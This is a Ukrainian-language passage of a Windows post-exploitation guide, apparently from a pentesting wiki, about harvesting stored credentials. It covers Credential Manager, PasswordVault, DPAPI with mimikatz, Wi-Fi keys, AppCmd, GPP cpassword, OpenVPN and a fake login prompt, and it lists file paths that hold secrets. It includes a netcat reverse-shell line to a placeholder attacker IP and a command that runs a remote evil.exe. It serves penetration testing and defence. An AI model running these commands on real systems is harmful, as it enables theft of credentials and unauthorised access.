Якщо програми не взаємодіють із Credential Manager, гадаю, вони не можуть використовувати облікові дані для певного ресурсу. Тому, якщо ваша програма хоче скористатися сховищем, вона має **взаємодіяти з Credential Manager і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Скористайтеся `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Тоді ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений бінарний файл запускається через SMB-шару.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданим набором облікових даних.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому тексті в Universal Windows Platform (UWP) `PasswordVault` (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його вміст можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell у межах активного сеансу користувача, щоб миттєво отримати всі збережені імена користувачів і паролі у відкритому тексті:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для значного підвищення ентропії під час шифрування використовується секрет користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від облікових даних користувача для входу**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, створені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` позначає [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений: переглянути його вміст за допомогою команди `dir` у CMD не можна, але це можна зробити через PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Ви можете використати **модуль mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете використати **модуль mimikatz** `dpapi::cred` з відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато** **masterkeys DPAPI** з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптів** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що розшифрувати їх може лише той самий користувач на тому самому комп’ютері, на якому їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях із розширенням `.xml`. Якщо скрипт або інвентаризація файлів вказує на такий файл, визначте фактичну теку профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може зберігати профілі в іншому місці](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Доступний для читання файл — це лише зачіпка; [`Export-Clixml` у Windows прив’язує зашифровані облікові дані до користувача й комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а будь-який відновлений обліковий запис повинен окремо мати відповідні права на потрібній службі. Спочатку перевірте шляхи й ACL, не виводячи зашифровані чи відкриті значення під час звичайного збору даних.

Щоб **розшифрувати** облікові дані PS із файлу, у якому вони зберігаються, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти багато DPAPI masterkeys** із пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте XML-файли, доступні для читання, у `%APPDATA%\mRemoteNG` і папці «Документи» користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Перш ніж вважати XML-файл потенційним джерелом облікових даних, визначте схему підключень і зашифровані атрибути `Password`. Збережене значення — це не пароль DPAPI/RDCMan; можливість відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний master password. Під час широкого пошуку не виводьте зашифровані значення.

**Експортовані профілі Remote Desktop Plus** також можуть бути доступні для читання в каталогах користувача або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, але не виводьте його та не припускайте, що це відкритий текст: [виробник зазначає](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створено, або налаштований менш суворо. Перш ніж покладатися на нього, перевірте походження файлу та умови відновлення.

### Sticky Notes

Іноді люди зберігають паролі та іншу інформацію в програмах для нотаток. Упакований застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки в `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші застосунки можуть використовувати інші сховища профілю користувача, зокрема LevelDB. Перш ніж вважати відсутність файла SQLite ознакою того, що нотаток немає, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом (WAL), копія лише `plum.sqlite` може не містити останніх зафіксованих нотаток. Збережіть відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і, якщо він є, долучіть `plum.sqlite-shm`; індекс у спільній пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису чи паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для розшифрування зашифрованого запису менеджера паролів також потрібні справжній ключ розшифрування та інтерпретація, специфічна для застосунку, перш ніж цей запис можна буде вважати підтвердженням входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права Administrator і запускати його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано облікові **дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі засобів підтримки

У деяких старих інсталяціях засобів віддаленої підтримки назви значень, пов’язаних із паролями, зберігаються у фіксованих ключах реєстру застосунку. Наприклад, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 значення `SecurityPasswordAES` позначало налаштований статичний пароль сеансу. Маркер у назві значення — це лише зачіпка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність для читання даних значення, його формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та наявності дозволу на використання цього облікового запису. Не виводьте зашифровані дані й відновлені паролі під час звичайного переліку.

### Спільні таблиці з захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування, але не є засобом безпеки; сам по собі він не доводить, що вміст книги зашифрований. Переглядайте лише файли, доступ до яких дозволено й які мають відношення до перевірки, та не виводьте потенційні секрети під час широкого переліку. Наявність шляху до доступного для читання файлу `.xlsx`, захищеного аркуша або прихованого стовпця сама по собі не доводить, що там є облікові дані або що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані й поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збирання. [У документації TeamCity](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` зазначено як місце зберігання змін віддаленого запуску; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберігати видалені або додані посилання на файл облікових даних, ключ шифрування чи скрипт, який використовує і те, і те. Наприклад, у робочому процесі PowerShell із `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft зазначає](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спершу перегляньте лише доступні назви патчів, а потім — за наявності дозволу — відповідний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення або посилання на ключ самі по собі не доводять наявність дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збирання.

### Користувацька ротація пароля локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із бінарним файлом засобу оновлення. Перевірте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігурації, слухач і дозволи сховища даних. Навіть якщо сховище даних прослуховує лише loopback-інтерфейс, локальний користувач із дійсними обліковими даними все одно може до нього під’єднатися, але сама автентифікація не доводить наявність дозволу на читання відповідних записів. Якщо початкове значення або матеріал ключа доступні поруч із зашифрованими даними, перш ніж покладатися на шифрування, перевірте точний спосіб виведення ключа. Схема, що детерміновано виводить ключ AES із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту цього пароля; у документації Go зазначено, що цей пакет не призначений для випадкових даних, важливих для безпеки. Перш ніж розглядати будь-який відновлений пароль як шлях до підвищення привілеїв, переконайтеся, що він досі дійсний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях до `.env` або зашифрований блок самі по собі нічого з цього не доводять. Не виводьте паролі й матеріал ключа під час звичайного переліку.

Для керованих паролів локального адміністратора використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище в каталозі або Entra та засоби контролю доступу відрізняються від користувацького локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як JAR-архіви в каталозі сервера `plugins`. У доступному для читання користувацькому плагіні можуть міститися конфігурація або байткод із вбудованими обліковими даними служби. Переглядайте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявність секрету, а відновлений пароль служби дає змогу отримати вищі привілеї лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle щодо JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у каталозі `Openfire\embedded-db`. Якщо поточний обліковий запис може читати цей файл, перевірте разом записи `OFUSER` і властивість `passwordKey`. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або шифруватися ключем, що міститься в цій властивості. Відновлений пароль має значення для підвищення привілеїв лише тоді, коли він досі дійсний для ідентичності з вищими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Цей шлях — лише зачіпка для інвентаризації, тож не виводьте вміст бази даних та облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може розкривати налаштовані порти консолі адміністратора та інтерфейс прив’язки навіть за використання зовнішньої бази даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback-інтерфейсу; це все одно дає змогу локальному обліковому запису під’єднатися до адреси, якщо слухач запущено. Перевірте разом фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів та ідентичність служби Openfire. Адміністратор, який може встановлювати плагіни, може змусити код плагіна виконуватися в контексті служби; це може дати значні привілеї, якщо служба працює від імені LocalSystem. Відповідний пароль облікового запису або доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора чи виконання коду. Див. [посібник постачальника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера криміналістичного керування

Конфігурації сервера Velociraptor, зазвичай із назвою `server.config.yaml`, можуть містити `CA.private_key` внутрішнього центру сертифікації. Якщо користувач із нижчими привілеями може читати цей ключ, він може отримати змогу створити сертифікат клієнта API. Чи дасть це змогу отримати вищі привілеї, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Конфігурація клієнта містить інші дані; її наявність не свідчить про доступ до центру сертифікації сервера. У деяких розгортаннях закритий ключ центру сертифікації зберігають офлайн, тож у доступній для читання конфігурації сервера може не бути ключа підпису.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та всіх захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо служба налаштована на інший шлях, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` у ньому справді є. Не виводьте закритий ключ у журнали чи результати переліку. Робочий процес постачальника `config api_client` використовує ключ центру сертифікації для видачі клієнтського сертифіката, але для цього також потрібна ефективна серверна роль; її створення чи змінення може вимагати права на запис у сховище даних або перезапуску. Наявна привілейована ідентичність сервера може забезпечити шлях навіть за відсутності таких прав на запис. Запити API з правами виконання запускаються в контексті відповідного сервера або агента, що може мати значні привілеї.

Захищайте конфігурацію сервера й резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису центру сертифікації офлайн і обмежуйте ролі API та доступ до слухача. Див. [документацію Velociraptor щодо API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його вбудоване зашифроване сховище може міститися за шляхом `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може називатися `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування вбудованого сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що збережені облікові дані досі дійсні чи надають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в реєстровому ключі `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху є будь-який запис, то це, найімовірніше, збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й потрібно, щоб вона запускалася автоматично під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка вже не працює. Я спробував створити кілька ключів ssh, додати їх за допомогою `ssh-add` і ввійти на машину через ssh. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Зчитувані файли резервних копій Windows Imaging (`.wim`) також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Спершу перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **імена елементів** образу, перш ніж щось із нього витягувати; сама назва файла `.wim` не доводить, що в ньому доступні вулики, а типові `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу; його слід перевіряти лише тоді, коли він входить до меж перевірки. Див. [рекомендації Microsoft щодо образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник із файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністратора на групі машин за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним задокументованим ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає спеціальний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація веб-сервера IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви в кореневому каталозі IIS

Стара резервна копія ZIP, розміщена безпосередньо в кореневому каталозі вебсайту, доступному через HTTP, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перш ніж вважати це витоком даних, перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP. Стандартний шлях `C:\inetpub\wwwroot` — лише один із можливих варіантів. Швидка локальна інвентаризація дасть змогу переглянути назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Попросити надати облікові дані

Завжди можна **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо ви думаєте, що він може їх знати (зауважте, що прямо **просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які раніше містили **паролі** у **відкритому тексті** або у форматі **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
